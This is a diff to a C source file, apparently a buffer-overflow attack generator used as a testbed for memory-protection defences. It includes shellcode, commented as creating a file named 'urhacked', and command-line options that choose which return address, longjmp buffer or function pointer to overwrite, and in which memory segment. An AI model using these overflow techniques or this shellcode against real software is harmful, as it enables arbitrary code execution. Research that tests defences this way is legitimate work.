@@ -2,10 +2,17 @@
 #include <string.h>
 #include <stdlib.h>
 #include <setjmp.h>
+#include <getopt.h>
 
 #include "attack_generator.h"
 
-static char shellcode_no_noop[] =
+/**
+ * Shellcode with NOP sled that touches a file 'urhacked'
+ * @author Aman Sharma
+ *
+ */
+
+static char createfile_shellcode[] = 
   "\x17\x05\x00\x00"
   "\x13\x05\xc5\x01"
   "\x93\x05\x10\x24"
@@ -18,7 +25,9 @@ static char shellcode_no_noop[] =
 #define OLD_BP_PTR   __builtin_frame_address(0)
 #define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)
 
-const size_t shellcode_no_noop_size = sizeof(shellcode_no_noop);
+//static size_t size_shellcode_createfile = sizeof(createfile_shellcode) / sizeof(createfile_shellcode[0]) - 1;
+
+const size_t size_createfile_shellcode = sizeof(createfile_shellcode);
 
 ATTACKFORM attack;
 
@@ -33,6 +42,59 @@ struct attackme data_struct = {"AAAAAAAA", &fooz};
 struct pointer_struct data_indirect;
 
 struct jmp_struct data_jmp_struct;
+
+
+
+int main(int argc, char **argv) {
+  int option_char;
+//  int i = 0;
+  jmp_buf stack_jmp_buffer_param;
+
+  //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
+  jmp_buf stack_jmp_buffer_param_array[512];
+/*
+  for(i=0; i < 512; i++){
+	if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
+		break;
+  }
+  if (i == 512){
+	fprintf(stderr,"Error. Can't allocate appropriate stack_jmp_buffer\n");
+	exit(1);
+  }
+*/
+
+  while((option_char = getopt(argc, argv, "t:i:c:l:f:d:e:o")) != -1) {
+    switch(option_char) {
+    case 't':
+      set_technique(optarg);
+      break;
+    case 'c':
+      set_code_ptr(optarg);
+      break;
+    case 'l':
+      set_location(optarg);
+      break;
+    case 'f':
+      set_function(optarg);
+      break;
+    default:
+	fprintf(stderr, "Error: Unknown command option \"%s\"\n", optarg);
+      exit(1);
+      break;
+    }
+  }
+
+  /* Check if attack form is possible */
+  if(is_attack_possible()) {
+    //NN
+    perform_attack(&fooz, stack_jmp_buffer_param);
+  } else {
+	fprintf(stderr, "Error: Attack Impossible\n", optarg);
+    //exit(ATTACK_IMPOSSIBLE);
+  }
+}
+
+
 
 void generate_payload() {
 
@@ -71,16 +133,6 @@ void generate_payload() {
   printf("%c\n", *((char*) payload.buffer));
 }
 
-boolean is_attack_possible() {
-  switch(attack.location) {
-    case HEAP:
-      if((attack.technique == DIRECT) && attack.code_ptr == RET_ADDR) {
-        return FALSE;
-      }
-  }
-
-  return TRUE;
-}
 
 
 void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param) {  
@@ -118,7 +170,7 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
   attack.code_ptr = LONGJMP_BUF_DATA;
   attack.location = STACK;
 
-  payload.size = shellcode_no_noop_size;
+  payload.size = size_createfile_shellcode;
 
   // set the buffer to be used
   switch(attack.location) {
@@ -212,7 +264,7 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
    }
   }
 
-  payload.contents = shellcode_no_noop;
+  payload.contents = createfile_shellcode;
 
   generate_payload(&fooz);
 
@@ -250,12 +302,181 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
     }
   }
 
-  payload.contents = shellcode_no_noop;
+  payload.contents = createfile_shellcode;
 
   generate_payload(&fooz);
 }
 
-int main() {
-  jmp_buf jb;
-  perform_attack(&fooz, jb);
+
+
+boolean is_attack_possible() {
+  switch(attack.location) {
+    case STACK:
+      if((attack.technique == DIRECT) &&
+          ((attack.code_ptr == LONGJMP_BUF_HEAP) ||
+          (attack.code_ptr == LONGJMP_BUF_BSS) ||
+          (attack.code_ptr == LONGJMP_BUF_DATA) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
+        fprintf(stderr, "Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
+        return FALSE;
+      }
+      break;
+    case HEAP:
+      if((attack.technique == DIRECT) &&
+          ((attack.code_ptr == RET_ADDR) ||
+          (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
+          (attack.code_ptr == LONGJMP_BUF_STACK) ||
+          (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
+          (attack.code_ptr == LONGJMP_BUF_BSS) ||
+          (attack.code_ptr == LONGJMP_BUF_DATA) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_BSS)  )) {
+        fprintf(stderr, "Error: Impossible perform a direct attack on the heap into another memory segment.\n");
+        return FALSE;
+      }
+      break;
+    case BSS:
+      if((attack.technique == DIRECT) &&
+          ((attack.code_ptr == RET_ADDR) ||
+          (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
+          (attack.code_ptr == LONGJMP_BUF_STACK) ||
+          (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
+          (attack.code_ptr == LONGJMP_BUF_HEAP) ||
+          (attack.code_ptr == LONGJMP_BUF_DATA) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_HEAP)  )) {
+        fprintf(stderr, "Error: Impossible to peform a direct attack in the BSS segment into another memory segment.\n");
+        return FALSE;
+      }
+      break;
+    case DATA:
+      if((attack.technique == DIRECT) &&
+          ((attack.code_ptr == RET_ADDR) ||
+          (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
+          (attack.code_ptr == LONGJMP_BUF_STACK) ||
+          (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
+          (attack.code_ptr == LONGJMP_BUF_HEAP) ||
+          (attack.code_ptr == LONGJMP_BUF_BSS) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
+          (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
+        fprintf(stderr, "Error: Impossible to perform a direct attack in the Data segment into another memory segment.\n");
+        return FALSE;
+      }
+      break;
+    default:
+      fprintf(stderr, "Error: Unknown choice of buffer location\n");
+      return FALSE;
+  }
+
+  //NN For now only direct attacks to struct_func
+  switch (attack.code_ptr){
+    case STRUCT_FUNC_PTR_STACK:
+    case STRUCT_FUNC_PTR_HEAP:
+    case STRUCT_FUNC_PTR_DATA:
+    case STRUCT_FUNC_PTR_BSS:
+      if(attack.technique != DIRECT){
+        fprintf(stderr,"Error: Impossible...for now at least :)\n");
+        return FALSE;
+      }
+      break;
+    default:
+      break;  
+  }
+
+  return TRUE;
+}
+
+void set_technique(char *choice) {
+  if(strcmp(choice, opt_techniques[0]) == 0) {
+    attack.technique = DIRECT;
+  } else if(strcmp(choice, opt_techniques[1]) == 0) {
+    attack.technique = INDIRECT;
+  } else {
+    fprintf(stderr, "Error: Unknown choice of technique \"%s\"\n",
+	    choice);
+  }
+}
+
+void set_code_ptr(char *choice) {
+  if(strcmp(choice, opt_code_ptrs[0]) == 0) {
+    attack.code_ptr = RET_ADDR;
+  } else if(strcmp(choice, opt_code_ptrs[3]) == 0) {
+    attack.code_ptr = FUNC_PTR_STACK_PARAM;
+  } else if(strcmp(choice, opt_code_ptrs[7]) == 0) {
+    attack.code_ptr = LONGJMP_BUF_STACK;
+  } else if(strcmp(choice, opt_code_ptrs[8]) == 0) {
+    attack.code_ptr = LONGJMP_BUF_STACK_PARAM;
+  } else if(strcmp(choice, opt_code_ptrs[9]) == 0) {
+    attack.code_ptr = LONGJMP_BUF_HEAP;
+  } else if(strcmp(choice, opt_code_ptrs[10]) == 0) {
+    attack.code_ptr = LONGJMP_BUF_BSS;
+  } else if(strcmp(choice, opt_code_ptrs[11]) == 0) {
+    attack.code_ptr = LONGJMP_BUF_DATA;
+  } else if(strcmp(choice,opt_code_ptrs[12]) == 0){
+    attack.code_ptr = STRUCT_FUNC_PTR_STACK;
+  } 
+    else if(strcmp(choice,opt_code_ptrs[13]) == 0){
+    attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
+  } 
+    else if(strcmp(choice,opt_code_ptrs[14]) == 0){
+    attack.code_ptr = STRUCT_FUNC_PTR_DATA;
+  } 
+    else if(strcmp(choice,opt_code_ptrs[15]) == 0){
+    attack.code_ptr = STRUCT_FUNC_PTR_BSS;
+  } 
+
+   else {
+      fprintf(stderr, "Error: Unknown choice of code pointer \"%s\"\n",
+	      choice);
+    exit(1);
+  }
+}
+
+void set_location(char *choice) {
+  if(strcmp(choice, opt_locations[0]) == 0) {
+    attack.location = STACK;
+  } else if(strcmp(choice, opt_locations[1]) == 0) {
+    attack.location = HEAP;
+  } else if(strcmp(choice, opt_locations[2]) == 0) {
+    attack.location = BSS;
+  } else if(strcmp(choice, opt_locations[3]) == 0) {
+    attack.location = DATA;
+  } else {
+      fprintf(stderr, "Error: Unknown choice of memory location \"%s\"\n",
+	      choice);
+    exit(1);
+  }
+}
+
+void set_function(char *choice) {
+  if(strcmp(choice, opt_funcs[0]) == 0) {
+    attack.function = MEMCPY;/*
+  } else if(strcmp(choice, opt_funcs[1]) == 0) {
+    attack.function = STRCPY;
+  } else if(strcmp(choice, opt_funcs[2]) == 0) {
+    attack.function = STRNCPY;
+  } else if(strcmp(choice, opt_funcs[3]) == 0) {
+    attack.function = SPRINTF;
+  } else if(strcmp(choice, opt_funcs[4]) == 0) {
+    attack.function = SNPRINTF;
+  } else if(strcmp(choice, opt_funcs[5]) == 0) {
+    attack.function = STRCAT;
+  } else if(strcmp(choice, opt_funcs[6]) == 0) {
+    attack.function = STRNCAT;
+  } else if(strcmp(choice, opt_funcs[7]) == 0) {
+    attack.function = SSCANF;
+  } else if(strcmp(choice, opt_funcs[8]) == 0) {
+    attack.function = FSCANF;
+  } else if(strcmp(choice, opt_funcs[9]) == 0) {
+    attack.function = HOMEBREW;*/
+  } else {
+      fprintf(stderr, "Error: Unknown choice of vulnerable function \"%s\"\n",
+	      choice);
+    exit(1);
+  }
 }
